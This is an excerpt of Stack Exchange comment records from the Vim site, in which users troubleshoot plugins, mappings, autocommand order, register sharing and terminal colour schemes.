  <row Id="6551" PostId="4423" Score="0" Text="The numbers are there because you enabled `set number` in your vimrc file. The `&gt;&gt;` are called signs, and are probably added by some plugin such as Syntastic which you added to your vimrc file. See: [How do I debug my vimrc file?](http://vi.stackexchange.com/q/2003/51)" CreationDate="2015-08-20T12:13:19.790" UserId="51" />
  <row Id="6552" PostId="4423" Score="0" Text="@Carpetsmoker I also suspected this happened because of some plugin , I have 27 plugins installed right now , is there a way i can just disable it directly instead of debugging the .vimrc file ?" CreationDate="2015-08-20T12:43:28.337" UserId="3242" />
  <row Id="6553" PostId="4423" Score="0" Text="Do you know which plugin does this? You need to know which plugin does this first, otherwise it's attempting to answer a question without actually knowing the question :-)" CreationDate="2015-08-20T12:56:05.583" UserId="51" />
  <row Id="6554" PostId="4423" Score="0" Text="@Carpetsmoker I guess that the only option then is to debug the plugins , but how do i disable a plugin ?" CreationDate="2015-08-20T13:02:37.430" UserId="3242" />
  <row Id="6555" PostId="4423" Score="1" Text="Just comment them out one-by-one and see when the problem stops appearing?" CreationDate="2015-08-20T13:03:42.677" UserId="51" />
  <row Id="6556" PostId="4423" Score="0" Text="@Carpetsmoker I debugged the .vimrc file and i finally found that the problem was the pathogen plugin , When i comment out the line : &quot;execute pathogen#infect()&quot; , the probem is solved but YouCompleteMe plugin doesn't work . any idea why ?  thanks for your help ." CreationDate="2015-08-20T13:45:35.590" UserId="3242" />
  <row Id="6557" PostId="4423" Score="0" Text="Pathogen is not a plugin, it's what installs all other plugins ;-) I don't want to put you off, but it looks like you don't really know what you're doing at all. Vim is not the easiest editor to learn (although not as hard as some make it out to be, either). It's best to gradually learn Vim, first the basics on how to use the editor (motions, buffers, etc.), and then move on and maybe install one or two plugins as you go along, once you've learned to use those plugins, you can install more plugins..." CreationDate="2015-08-20T13:52:18.667" UserId="51" />
  <row Id="6558" PostId="4423" Score="2" Text="... Yes, this will take more time, but you will actually *understand* what you're doing, rather than fumbling around cluelessly :-)" CreationDate="2015-08-20T13:56:30.203" UserId="51" />
  <row Id="6559" PostId="4423" Score="0" Text="No, `execute pathogen#infect()` isn't the problem.  That's just what's causing your plugin bundles to be loaded.  You need to disable individual plugin bundles to see which one is causing it.  If you rename the plugin directory so that it ends with a `~` that will prevent pathogen from loading it." CreationDate="2015-08-20T13:56:38.457" UserId="15" />
  <row Id="6560" PostId="4423" Score="0" Text="@jamessan thanks , it worked , and strangely it was YouCompleteMe the cause of the problem ." CreationDate="2015-08-20T14:18:05.623" UserId="3242" />
  <row Id="6561" PostId="4423" Score="0" Text="@Carpetsmoker Thanks for the advice .I just started reading &quot;Practical Vim&quot; ." CreationDate="2015-08-20T14:21:15.570" UserId="3242" />
  <row Id="6562" PostId="4423" Score="3" Text="So… you just installed Vim and you already have 27 plugins?" CreationDate="2015-08-20T16:01:26.243" UserId="54" />
  <row Id="6563" PostId="4428" Score="0" Text="I just saw that actually *that* patch isn't enabled, so ... it's probably not without issues." CreationDate="2015-08-20T23:46:10.417" UserId="1800" />
  <row Id="6564" PostId="4430" Score="0" Text="Thank you for the correction, @romainl" CreationDate="2015-08-21T06:55:48.940" UserId="210" />
  <row Id="6565" PostId="4430" Score="0" Text="Have you tried with launching vim without your config ? `vim -u NONE -N`, Maybe it's your configuration that cause the issue ... Also, you can read http://vi.stackexchange.com/a/2004/1821" CreationDate="2015-08-21T06:57:49.120" UserId="1821" />
  <row Id="6566" PostId="4430" Score="0" Text="Sure, I tried that. Unfortunately, it doesn't work. By the way, I think the problem is that the mapping doesn't work but the commands work if I type them manually." CreationDate="2015-08-21T07:27:55.277" UserId="210" />
  <row Id="6567" PostId="4426" Score="0" Text="What do you want to do with that new buffer?" CreationDate="2015-08-21T07:39:59.037" UserId="54" />
  <row Id="6568" PostId="4426" Score="0" Text="This would be mainly for searching through the logs, so having few buffer/tab with results of filtering would allow me to debug more efficiently (huge app, syslog debugging). But if you're asking more literally- I want to save this buffer/tab to a file." CreationDate="2015-08-21T08:05:41.643" UserId="3254" />
  <row Id="6569" PostId="4427" Score="0" Text="ok. this works. but I don't get what `qaq` does? it simply starts recording macro and then leave it. what's the purpose here?" CreationDate="2015-08-21T08:07:00.320" UserId="3254" />
  <row Id="6570" PostId="4362" Score="0" Text="@VanLaser `zO` and friends work recursively on folds under the cursor, but inserting text in a function doesn't necessarily happen at the cursor position (`append()`, for instance, appends by line number and doesn't move the cursor; neither does it set the `'[`,`']` marks)." CreationDate="2015-08-21T08:18:00.987" UserId="1306" />
  <row Id="6571" PostId="4430" Score="0" Text="I got it working on my vimrc file ... Can you give more informations about how you are doing this and how to reproduce your problem ?" CreationDate="2015-08-21T08:23:45.477" UserId="1821" />
  <row Id="6572" PostId="4370" Score="0" Text="Because of other problems with updating folds and because of a bug(?) in Vim for insert mode+expression folding I always do this when entering insert mode and restore when leaving insert mode or leaving the window, see http://vi.stackexchange.com/questions/3128/is-there-a-way-to-disable-the-foldexpr-during-autocomplete" CreationDate="2015-08-21T08:23:54.743" UserId="1306" />
  <row Id="6573" PostId="4427" Score="0" Text="As I said, clear a register" CreationDate="2015-08-21T08:50:05.130" UserId="71" />
  <row Id="6574" PostId="4428" Score="0" Text="well, if you need async, i suggest, looking into neovim" CreationDate="2015-08-21T09:06:56.410" UserId="71" />
  <row Id="6575" PostId="4433" Score="1" Text="Do you really need to leave visual mode first? I know there are cases when you do, but I think with `\%V` you'd be fine starting the substitute from visual mode. Save some keystrokes :)" CreationDate="2015-08-21T10:26:45.150" UserId="1306" />
  <row Id="6576" PostId="4434" Score="0" Text="I like your solution, can you give some more details for the differents parts ?" CreationDate="2015-08-21T10:27:03.883" UserId="1821" />
  <row Id="6577" PostId="4433" Score="1" Text="`0f'v;` could be `0vi'`" CreationDate="2015-08-21T11:14:05.230" UserId="1569" />
  <row Id="6578" PostId="4430" Score="1" Text="What exactly &quot;doesn't work&quot;? Please be precise with your problem description." CreationDate="2015-08-21T11:49:15.333" UserId="71" />
  <row Id="6582" PostId="4430" Score="0" Text="For some reason, the double backtick to escape symbols doesn't work here. I will update the question." CreationDate="2015-08-21T14:36:46.623" UserId="210" />
  <row Id="6583" PostId="4430" Score="0" Text="I did exactly the same and still I don't reproduce the issue :/" CreationDate="2015-08-21T14:41:47.693" UserId="1821" />
  <row Id="6584" PostId="4430" Score="0" Text="@Nobe4 I know! This shouldn't be so hard, but I guess something related to the backtick is causing this issue." CreationDate="2015-08-21T14:45:47.367" UserId="210" />
  <row Id="6585" PostId="4430" Score="0" Text="You check this question : http://vi.stackexchange.com/questions/3134/override-a-mapping-with-leader-key The part with the `:help key-mapping` may help you... Also, have you tried with `'` instead of backticks ?" CreationDate="2015-08-21T14:48:45.063" UserId="1821" />
  <row Id="6586" PostId="4430" Score="0" Text="Thank you. I read that section, but I don't think it helps a lot. The issue with ' is that the command to visually select pasted text doesn't work if I use ' instead of `. Should it work with both?" CreationDate="2015-08-21T15:00:34.667" UserId="210" />
  <row Id="6587" PostId="4430" Score="0" Text="Yes it should, see `:h ']`, you tried with only one mapping ?" CreationDate="2015-08-21T15:07:22.130" UserId="1821" />
  <row Id="6588" PostId="4436" Score="0" Text="Could you give some screen shots so we can see how it 'breaks' your layout please ? :)" CreationDate="2015-08-21T15:08:27.907" UserId="1821" />
  <row Id="6589" PostId="4430" Score="0" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/27243/discussion-between-nobe4-and-robert-smith)." CreationDate="2015-08-21T15:09:44.370" UserId="1821" />
  <row Id="6590" PostId="4436" Score="0" Text="@Nobe4 the layout is random. i split windows all the time. by having `&lt;C-w&gt;o` only current window remains, so i lost the view of multiple files. i am expecting recover to whatever layout after i copy the text i need" CreationDate="2015-08-21T15:10:54.020" UserId="1097" />
  <row Id="6591" PostId="4436" Score="0" Text="you could define a function that cleans your display and another one that restores it ... Have you tried searching this way ? Writing vim function is an excellent way to learn :)" CreationDate="2015-08-21T15:18:36.707" UserId="1821" />
  <row Id="6593" PostId="4440" Score="2" Text="Why do you believe this to be the case ... ?" CreationDate="2015-08-21T15:38:57.940" UserId="51" />
  <row Id="6594" PostId="4440" Score="0" Text="Using another system where a &quot;macro&quot; intimidated key strokes and mouse movements. Based on your comment, it sounds like my question might be absurd." CreationDate="2015-08-21T16:07:01.543" UserId="3264" />
  <row Id="6595" PostId="4442" Score="0" Text="Neat I didn't know you could pipe the contents of a buffer to a command!  Thanks man!" CreationDate="2015-08-21T16:33:28.360" UserId="1065" />
  <row Id="6596" PostId="4436" Score="0" Text="@Nobe4 but how. i know it's not a one command existing solution but i will need a guideline at least." CreationDate="2015-08-21T16:38:07.443" UserId="1097" />
  <row Id="6597" PostId="4442" Score="1" Text="That's one of Vim's superpowers. If you use it, [Unix is your IDE](https://www.linux.com/learn/tutorials/442419-vim-tips-working-with-external-commands)." CreationDate="2015-08-21T16:38:18.750" UserId="3079" />
  <row Id="6598" PostId="4431" Score="0" Text="This is great but has a flaw- it only works with existing files and doesn't work with new buffer/tab. Do you have any idea how to make this work for unsaved files? And one more question what does #&lt;Left&gt;&lt;Left&gt; and the # itself do?&#xA;&#xA;EDIT: I get this &lt;Left&gt;&lt;Left&gt; - it's just moving cursor for it to be in the right place to insert &quot;pattern&quot;" CreationDate="2015-08-21T18:17:53.797" UserId="3254" />
  <row Id="6599" PostId="4431" Score="0" Text="`#` represents &quot;the alternate file&quot; (usually it's the previous buffer). It is expanded by Vim before sending the command to the shell." CreationDate="2015-08-21T19:19:32.230" UserId="54" />
  <row Id="6600" PostId="4445" Score="0" Text="i have problems with `mksession` since i use nerdtree. i have problems with general session managers, because these managers try to preserve all my key bindings, autocmds, commands, etc. however i don't really need. is there a nice way just to remember the layout of windows?" CreationDate="2015-08-21T19:44:51.037" UserId="1097" />
  <row Id="6601" PostId="4446" Score="0" Text="thanks. i see the sense here. btw, sorry for the confusion, but i really meant using putty." CreationDate="2015-08-21T20:17:37.463" UserId="1097" />
  <row Id="6602" PostId="4446" Score="0" Text="PuTTY can do X forwarding: http://tartarus.org/~simon/putty-snapshots/htmldoc/Chapter3.html#using-x-forwarding" CreationDate="2015-08-21T20:23:23.100" UserId="54" />
  <row Id="6603" PostId="4387" Score="0" Text="[UndoTree](https://github.com/mbbill/undotree) does actually highlight changed *lines*, but it doesn't do it in realtime. I think it uses GNU diff. Getting word granularity would be an [extra step](https://github.com/joeytwiddle/jsh/blob/master/code/shellscript/diffing/worddiff.sh) (e.g. split lines at [word breaks](https://github.com/joeytwiddle/jsh/blob/master/code/shellscript/stream/escapenewlines.sh), diff, recombine lines)." CreationDate="2015-08-22T03:08:13.163" UserId="630" />
  <row Id="6604" PostId="4387" Score="0" Text="These plugins come close, but they are still line-based: [smeargle](https://github.com/FriedSock/smeargle) can highlight lines changed since the last save. [changesPlugin](https://github.com/chrisbra/changesPlugin) marks changed lines (including deletions) in the gutter on the left." CreationDate="2015-08-22T03:36:56.447" UserId="630" />
  <row Id="6605" PostId="4447" Score="2" Text="`set noswapfile` ?" CreationDate="2015-08-22T09:06:34.953" UserId="1145" />
  <row Id="6606" PostId="4444" Score="0" Text="All true, but beware that cut &amp; [wp]aste operations with the mouse outside Vim _can_ interfere with the contents of Vim's clipboard if done at the wrong moment." CreationDate="2015-08-22T09:20:09.650" UserId="2313" />
  <row Id="6607" PostId="4445" Score="0" Text="Uh I've struggled more than once with NerdTree on different topics, I'll see if I can find a workaround ;-)" CreationDate="2015-08-22T10:11:49.223" UserId="1841" />
  <row Id="6608" PostId="4444" Score="0" Text="@SatoKatsura: You're totally right, I'll add this observation to my answer." CreationDate="2015-08-22T10:12:50.467" UserId="1841" />
  <row Id="6610" PostId="4431" Score="0" Text="Ok. Thanks. I tested it in gVim but I get &quot;shell returned 1&quot; and an empty buffer, but similar `:command! -nargs=1 Filter %y z|tabnew|0put=@z|%!grep -n &lt;args&gt;` works perfect (a little bit slow though). That's what I needed! Thanks again." CreationDate="2015-08-22T10:47:12.020" UserId="3254" />
  <row Id="6611" PostId="4430" Score="0" Text="@RobertSmith: As you found a solution to your problem could you make an answer to explain what you did instead of putting it in the question please? (You'll find a button &quot;Answer Your Question&quot; at the bottom of this page)" CreationDate="2015-08-22T11:08:41.560" UserId="1841" />
  <row Id="6612" PostId="4387" Score="1" Text="@joeytwiddle, changesPlugin can also highlight the last change region" CreationDate="2015-08-22T11:26:27.753" UserId="71" />
  <row Id="6613" PostId="4437" Score="0" Text="@Nobe4, really? `help list-functions`." CreationDate="2015-08-22T14:31:23.017" UserId="54" />
  <row Id="6614" PostId="4442" Score="0" Text="`:sort` works on the whole buffer by default so you can leave out the `%`." CreationDate="2015-08-22T14:33:20.643" UserId="54" />
  <row Id="6615" PostId="4442" Score="0" Text="Edited, thanks." CreationDate="2015-08-22T14:37:38.663" UserId="3079" />
  <row Id="6617" PostId="4430" Score="0" Text="I know but I was expecting @Nobe4 to post an answer to mark it as correct." CreationDate="2015-08-22T15:03:00.137" UserId="210" />
  <row Id="6618" PostId="4430" Score="1" Text="I'll do it, I though it was necessary... Thanks for inviting me to do" CreationDate="2015-08-22T15:04:05.057" UserId="1821" />
  <row Id="6619" PostId="4077" Score="1" Text="Alternatively, `autocmd InsertLeave * normal mZ` will remember the last edited file in the global mark *Z*. You can get back to it with `g'Z`.&#xA;//&#xA;I have `nmap &lt;C-y&gt; g'Z` but I still tend to use Ctrl-U more often." CreationDate="2015-08-22T17:18:42.717" UserId="630" />
  <row Id="6620" PostId="4453" Score="0" Text="So, no configurable option? Something like `splitright` for `:help`?" CreationDate="2015-08-22T19:31:59.630" UserId="205" />
  <row Id="6621" PostId="4453" Score="0" Text="I'm not sure to understand what you mean, you'd prefer to be able to choose where the help window should be placed?" CreationDate="2015-08-22T19:35:27.017" UserId="1841" />
  <row Id="6622" PostId="4452" Score="0" Text="@statox sorry about that. Dunno what I was thinking when I wrote that." CreationDate="2015-08-22T19:38:34.710" UserId="205" />
  <row Id="6623" PostId="4452" Score="0" Text="Ahah no need to be sorry it also happens to the best ones ;-)" CreationDate="2015-08-22T19:39:48.673" UserId="1841" />
  <row Id="6624" PostId="4455" Score="1" Text="That would be a good idea to also show what is your `HelpInNewTab()` function because I think this isn't a built-in feature so we can't really test your solution." CreationDate="2015-08-22T20:41:50.443" UserId="1841" />
  <row Id="6625" PostId="4453" Score="0" Text="I think you meant `:rightbelow` instead of `:botright`." CreationDate="2015-08-22T21:26:45.220" UserId="205" />
  <row Id="6626" PostId="4464" Score="1" Text="I'm curious: how does this differ from `autocmd FileType help wincmd L`? Any edge cases?" CreationDate="2015-08-22T21:28:58.607" UserId="205" />
  <row Id="6627" PostId="4464" Score="0" Text="I think that gets triggered twice, at least sometimes (try adding an echo there). It might be something to do with the help window opening, than going to the specific help tag. So, the `BufEnter` would be slightly more efficient. Not to mention adding a command that, when triggered twice, would become &quot;undone&quot; (cancel itself)." CreationDate="2015-08-22T21:34:43.593" UserId="1800" />
  <row Id="6628" PostId="4453" Score="2" Text="Well it depends on the behavior you are expecting, let says that you should play with `:lefta[bove]`, `:rightb[elow]`, `:to[pleft]` and `:bo[tright]` and see which one you prefer. I prefer `:botright` over `:rightbelow` because what ever my layout is, I'll get a help windows of the full height of the screen. With `:rightbelow` is I already have an horizontal split my help window will be of the height of this split." CreationDate="2015-08-22T22:01:07.293" UserId="1841" />
  <row Id="6629" PostId="4446" Score="0" Text="Just out of curiosity: is there a way to do that with an unwritten buffer? (I can use `%` if the buffer wasn't written once before). Also +1 for X forwarding." CreationDate="2015-08-22T22:10:19.593" UserId="1841" />
  <row Id="6630" PostId="4472" Score="0" Text="Excellent. This will be very useful for the times I have gvim open covering a vertical half of my screen." CreationDate="2015-08-22T22:11:07.457" UserId="205" />
  <row Id="6631" PostId="4446" Score="0" Text="@statox, you can use `:tabnew|b#`." CreationDate="2015-08-22T22:21:01.180" UserId="54" />
  <row Id="6632" PostId="4446" Score="0" Text="@romainl: Amazing! Thanks a lot!" CreationDate="2015-08-22T22:22:27.760" UserId="1841" />
  <row Id="6633" PostId="4471" Score="0" Text="Excellent answer. Thank you." CreationDate="2015-08-23T03:07:47.060" UserId="210" />
  <row Id="6634" PostId="4435" Score="0" Text="I take it this is a hypothetical question (since you say *While I think that I should always use my two hands to use Vim*), for anyone considering this practically: A hands free phone device (eg a bluetooth headset), is probably the way to go when typing while on the phone." CreationDate="2015-08-23T07:46:43.313" UserId="360" />
  <row Id="6635" PostId="4435" Score="0" Text="Yeah that is what I realised when I tried to use vim to 'go to line xx' or 'scroll down a little'." CreationDate="2015-08-23T07:48:23.927" UserId="1821" />
  <row Id="6636" PostId="4474" Score="0" Text="You can check that your terminal doesn't alter the actual solarized colors. It may lead to the issue that the generated colors are correct but your terminal are displaying them differently." CreationDate="2015-08-23T10:19:58.290" UserId="1821" />
  <row Id="6637" PostId="4476" Score="0" Text="Or use something like this: https://github.com/ardagnir/united-front" CreationDate="2015-08-23T11:08:57.243" UserId="1800" />
  <row Id="6638" PostId="4474" Score="0" Text="If I set my xterm colorscheme to _White on Black_ and then just run `vim`, the colors are completely off (neither standard vim colors nor solarized vim colors). If I instead run `vim -u NONE -N` (not sourced my vimrc but still nocompatible enabled), the colors are standard vim colors.&#xA;So indeed solarized colors in vim only seem to work for me when I set the appropriate xterm colors as well. Do you know why I might have this issue?" CreationDate="2015-08-23T11:11:48.990" UserId="3282" />
  <row Id="6640" PostId="4475" Score="0" Text="Syntax highlighting is not enabled by default, you need to enable it yourself, as well as filetype detection, in your `vimrc`: `filetype plugin indent on` and `syntax on`." CreationDate="2015-08-23T11:17:09.973" UserId="54" />
  <row Id="6641" PostId="4476" Score="0" Text="This sounds weird: you want the effect of X-integration without actual X-integration. Can't you simply install a proper Vim?" CreationDate="2015-08-23T11:20:36.963" UserId="54" />
  <row Id="6642" PostId="4453" Score="2" Text="Sadly, writing correct `cabbrev` commands involves some [ritual](http://vim.wikia.com/wiki/Replace_a_builtin_command_using_cabbrev)." CreationDate="2015-08-23T11:21:39.007" UserId="2313" />
  <row Id="6643" PostId="4478" Score="0" Text="Technically, you can also get the correct colors in a terminal, provided that you install a solarized color theme for the terminal.  But yes, you can't do that in Vim alone." CreationDate="2015-08-23T11:26:12.797" UserId="2313" />
  <row Id="6644" PostId="4476" Score="0" Text="No: you need both `+clipboard` and `+xterm_clipboard`, and only the contents of the clipboard is shared, via the system clipboard.  Other registers are not shared." CreationDate="2015-08-23T11:33:29.597" UserId="2313" />
  <row Id="6645" PostId="4478" Score="0" Text="Ok. So I need to change the colors of my terminal emulator to the solarized colors (that is how I have it anyway the whole time) - everything looks great then. But using the `:TOhtml` command will create a html file then with colors looking _different_ than the solarized ones I see in vim. Is there a way to create a html file with the solarized colors?" CreationDate="2015-08-23T11:45:38.277" UserId="3282" />
  <row Id="6646" PostId="4478" Score="0" Text="@SatoKatsura, when run in a terminal, Vim doesn't have access to the actual rgb/hex value of &quot;red&quot; or &quot;13&quot; so `:TOhtml` can't accurately use the user-defined color in the generated HTML. The *only* way to get an output that looks like what you have in Vim is to run `:TOhtml` in GVim/MacVim." CreationDate="2015-08-23T11:45:52.540" UserId="54" />
  <row Id="6647" PostId="4478" Score="0" Text="@cbaumhardt, you didn't get it, did you? You *can't* obtain what you want in Vim. **Only in GVim.**" CreationDate="2015-08-23T11:47:05.093" UserId="54" />
  <row Id="6648" PostId="4478" Score="0" Text="I did indeed not get it with your previous answer. Thank you for clarification." CreationDate="2015-08-23T12:01:48.470" UserId="3282" />
  <row Id="6649" PostId="4476" Score="0" Text="@romainl: Not the X-integration was the key point of my question, but rather register sharing across different vim sessions as I want to work with multiple registers not only with &quot;+.&#xA;Register sharing across vim sessions works with Christian Brabandt's answer or VanLasers comment." CreationDate="2015-08-23T12:25:18.893" UserId="3282" />
  <row Id="6650" PostId="4482" Score="0" Text="Possible duplicate of http://stackoverflow.com/q/8316139/2558252" CreationDate="2015-08-23T18:35:39.720" UserId="1821" />
  <row Id="6651" PostId="4483" Score="0" Text="`:help zi` plus scrolling up a bit in the help was a useful read. One more command learned :)" CreationDate="2015-08-23T18:50:20.213" UserId="3282" />
  <row Id="6652" PostId="4481" Score="0" Text="thats work in the case of function has a paramettre , but in the case of the function hase no paramettre it insert    obg.fun()()      it insert () two times" CreationDate="2015-08-23T19:09:18.700" UserId="3285" />
  <row Id="6653" PostId="4481" Score="0" Text="What function? Snippet?" CreationDate="2015-08-23T19:34:41.783" UserId="1800" />
  <row Id="6654" PostId="4481" Score="0" Text="plz look at :   https://github.com/Shougo/neocomplete.vim/issues/461    you will understand  the problem" CreationDate="2015-08-23T19:48:51.323" UserId="3285" />
  <row Id="6655" PostId="4481" Score="0" Text="i use neosnnipet with neocomplete  for autocompletion  ,  when i chose the function to autocomplete neosnippet generate automaticly a snippet to insert all function prototype" CreationDate="2015-08-23T19:50:49.797" UserId="3285" />
  <row Id="6656" PostId="4481" Score="0" Text="I will give you my advice: *DON'T* use the same key for autocompletion and snippet expansion. Use `&lt;C-j&gt;` for snippets." CreationDate="2015-08-23T19:52:00.753" UserId="1800" />
  <row Id="6657" PostId="4481" Score="0" Text="yeah but it will be cool , with that we can have vim autocompletion like ide" CreationDate="2015-08-23T19:54:48.653" UserId="3285" />
  <row Id="6658" PostId="4481" Score="0" Text="If you use the same key, Vim won't know when you want to autocomplete only, or to autocomplete *and* expand snippet. You either have to use another key, OR use a 2-step process (press Enter once to complete and close popup, press Enter again to expand snippet, if you want) -&gt; the 1st method is faster. You should at least use Tab for some of that functionality, instead of Enter." CreationDate="2015-08-23T20:03:30.860" UserId="1800" />
  <row Id="6659" PostId="4481" Score="0" Text="no vim autocomplete and expand at the same time that work for me  , the problem is when i map &lt; cr&gt; key  thatswork for autocomplete and expand at the same time , but with that &lt; cr&gt; key will not work in insert mode for returning into new line" CreationDate="2015-08-23T20:06:04.060" UserId="3285" />
  <row Id="6660" PostId="96" Score="0" Text="For some international keyboards, you may need to press `&quot;&lt;Space&gt;` to get a `&quot;`. So in those case you would have to press `&quot;&lt;Space&gt;+y` or `&quot;&lt;Space&gt;*y` to copy." CreationDate="2015-08-23T18:53:48.750" UserId="3286" />
  <row Id="6661" PostId="4485" Score="0" Text="thats work but there is one last problem look plz here at the end : https://github.com/Shougo/neocomplete.vim/issues/461" CreationDate="2015-08-23T20:14:28.460" UserId="3285" />
  <row Id="6662" PostId="4486" Score="1" Text="You can do `d/a` to delete to the next `a` and `c/.` to delete to the next `.`. If you use `hlsearch` and don't want it when doing this operation, you can create a mapping which does your `d/` operation and then disables the highlighting (ends with `:nohlsearch`)." CreationDate="2015-08-23T20:49:46.573" UserId="1306" />
  <row Id="6663" PostId="4486" Score="2" Text="You could use (or study) a plugin such as https://github.com/rhysd/clever-f.vim (with `g:clever_f_across_no_line` set to 0 and other options enabled/disabled at will)." CreationDate="2015-08-23T20:58:32.900" UserId="1800" />
  <row Id="6664" PostId="4486" Score="1" Text="Dahu made a plugin for this: https://github.com/dahu/vim-fanfingtastic" CreationDate="2015-08-23T20:59:11.757" UserId="865" />
  <row Id="6667" PostId="4370" Score="0" Text="Thanks @Nobe4, I noticed your comment but I forgot to update afterwords." CreationDate="2015-08-23T21:35:14.550" UserId="21" />
  <row Id="6669" PostId="4362" Score="0" Text="@Rene I think my answer should be a working solution. Am I wrong?" CreationDate="2015-08-23T21:35:43.780" UserId="21" />
  <row Id="6671" PostId="4491" Score="1" Text="You might want to use `!=#` instead of `!=` on UNIX, and `!=?` on Windows.  Otherwise the result depends on the value of `ignorecase`." CreationDate="2015-08-24T05:35:20.613" UserId="2313" />
  <row Id="6672" PostId="4491" Score="0" Text="Could you point me to an explaination of the difference between `!=#` and `!=?` ? Because on `:h expr4` it doesn't mention Windows/Unix." CreationDate="2015-08-24T05:42:49.753" UserId="1821" />
  <row Id="6673" PostId="4493" Score="0" Text="I think most of the explanations are OK, can you give a list of the ones you cannot understand ?" CreationDate="2015-08-24T09:17:24.127" UserId="1821" />
  <row Id="6674" PostId="4493" Score="0" Text="@Nobe4 I'm not talking about individual explanations of them, which are indeed OK, but about how they interact with one another and in what order they happen. For eg., `WinEnter` says &quot;Vim executes the BufEnter autocommands after the WinEnter autocommands&quot;, `TabEnter` says &quot;After triggering the WinEnter and before triggering the BufEnter event&quot;, it's all scattered like this into many places. And sometimes it's not mentioned at all (for eg. `BufRead` doesn't mention whether it runs after BufEnter or before - maybe an expert can infer it from some other piece of info there, but I can't." CreationDate="2015-08-24T09:22:19.800" UserId="2374" />
  <row Id="6675" PostId="4493" Score="0" Text="So, my intent here is to create a single, simple reference for the order of these events that can be looked up quickly by non-experts, in order to be more precise in our `autocmd` event specifications." CreationDate="2015-08-24T09:23:03.007" UserId="2374" />
  <row Id="6676" PostId="4493" Score="0" Text="OK I didnt understand the question. You can try to log every event, and see the order of appearance (I can make an answer if you like)" CreationDate="2015-08-24T09:23:33.983" UserId="1821" />
  <row Id="6677" PostId="4493" Score="0" Text="Your intent is actually to ask about somebody providing such a simple reference, not create one (yourself) ;)" CreationDate="2015-08-24T09:36:57.887" UserId="1800" />
  <row Id="6678" PostId="4493" Score="0" Text="@VanLaser yes, because I don't have the expertise to understand the intricacies of it, and will probably mess it up and provide wrong information in the attempt. Better to leave it to the experts!" CreationDate="2015-08-24T09:43:42.460" UserId="2374" />
  <row Id="6679" PostId="4493" Score="0" Text="I think creating such a reference is a great idea and should benefit from the community participation, so maybe you should head for a &quot;real&quot; project (maybe a github with a fancy github page) rather than a vi.SE question... Also even if you think you are not an expert, you can start scratching the surface of how it's work. You can log all events from vim, and start your study from there. As no reference exists it can be a great thing to start one :)" CreationDate="2015-08-24T09:45:24.490" UserId="1821" />
  <row Id="6680" PostId="4491" Score="1" Text="UNIX filenames are (usually) case-sensitive, Windows ones are case-insensitive." CreationDate="2015-08-24T09:56:54.903" UserId="2313" />
  <row Id="6681" PostId="4495" Score="2" Text="This is only true when you're editing a single file.  Contrary to the popular belief, the order of applying `autocmd`s across multiple files is _not_ well-defined.  And even with a single file, the order has changed a few times with the version of Vim.  The problems this can (and do) cause for plugins have been discussed to death on vim_dev, and the overall design is not going to change in the predictible future.  As for getting a _comprehensive_ understanding, well, there are 139 occurrences of `apply_autocmds` in the sources for Vim 7.4.827.  Good luck with that." CreationDate="2015-08-24T10:18:04.750" UserId="2313" />
  <row Id="6682" PostId="4495" Score="0" Text="@SatoKatsura This is the kind of expert opinion I was looking for, thanks! Is there some reference you can suggest to learn more about this (other than diving into Vim's sources)? Also, this might be entirely out of your area of interest, but do you have any idea if things are better defined in the 'Neovim'-land?" CreationDate="2015-08-24T10:28:39.313" UserId="2374" />
  <row Id="6683" PostId="4495" Score="0" Text="I'm afraid I don't know of any definitive reference.  `autocmd`s in Vim are a mess, I don't think it's actually _possible_ to write a definitive reference, except for a few simple cases.  I suppose everybody just settles for &quot;usually works&quot;, and shrugs when it doesn't.  As for neovim, I personally have mixed feelings about the project.  I haven't looked at the code recently; I suppose you can get an answer on their issue tracker." CreationDate="2015-08-24T10:49:08.163" UserId="2313" />
  <row Id="6684" PostId="4362" Score="0" Text="@KarlYngveLervåg I am currently in a foreign country and don't have my development computer with me, so that I cannot check if it works for me. Please allow me another week until I'll come back to your answer. Sorry for the delay." CreationDate="2015-08-24T11:21:06.397" UserId="985" />
  <row Id="6685" PostId="4497" Score="1" Text="For what it's worth, I can't reproduce this in Linux Vim or Linux gVim..." CreationDate="2015-08-24T12:10:45.950" UserId="51" />
  <row Id="6686" PostId="4489" Score="1" Text="Very similar question with a useful answer: [Multiple cursors at desired location](http://vi.stackexchange.com/q/4307/51)" CreationDate="2015-08-24T12:51:17.000" UserId="51" />
  <row Id="6687" PostId="4500" Score="0" Text="Neat ! Where did you find that you could run a condition/function inside the autocommand ?" CreationDate="2015-08-24T13:00:48.100" UserId="1821" />
  <row Id="6688" PostId="4500" Score="2" Text="Well its the same principe as the @sundar answer excepted the condition isn't on the value of a variable but on the return value of a function." CreationDate="2015-08-24T13:03:38.767" UserId="1841" />
  <row Id="6689" PostId="4495" Score="0" Text="Also the term of &quot;event&quot; itself should subvert the idea of too fixed an order." CreationDate="2015-08-24T13:09:23.650" UserId="1800" />
  <row Id="6690" PostId="4116" Score="0" Text="@PeterLewerin Please post that as an answer." CreationDate="2015-08-24T14:30:20.827" UserId="1111" />
  <row Id="6691" PostId="4501" Score="0" Text="Do you think a github repository could do the job ? From what you explained the website should allow collaborative work, tags, host, allow discussion through issues ... So it can be a simple way to achieve that :)" CreationDate="2015-08-24T14:33:12.910" UserId="1821" />
  <row Id="6692" PostId="4497" Score="0" Text="@Carpetsmoker Thanks for checking, I've done some more reading and it does seem to be a MacVim specific problem. I'll update my question with some links for now and continue looking when I get a chance." CreationDate="2015-08-24T14:49:30.117" UserId="1306" />
  <row Id="6693" PostId="4503" Score="0" Text="I see a trailing `)` in your setting, is that related to the issue ? I also have the following error : `zsh:1: bad pattern: fnameescape(substitute(expand(  2`" CreationDate="2015-08-24T16:13:04.640" UserId="1821" />
  <row Id="6694" PostId="4116" Score="0" Text="@ChristopherBottoms: done." CreationDate="2015-08-24T17:16:41.743" UserId="2942" />
  <row Id="6695" PostId="4503" Score="0" Text="&quot;set&quot; doesn't evaluate the right-hand side of the = as vimscript, it just treats it as a string; your shell is not going to understand what &quot;fnameescape(...)&quot; is. Using &quot;let&quot; with string concatenation as in Sato's answer should work though, as it will evalute the right-hand side as vimscript." CreationDate="2015-08-24T17:56:13.497" UserId="72" />
  <row Id="6696" PostId="4504" Score="0" Text="Works great, but is there a way to prevent vi from going to console, just let the list of errors window display the errors?" CreationDate="2015-08-24T18:05:13.647" UserId="3050" />
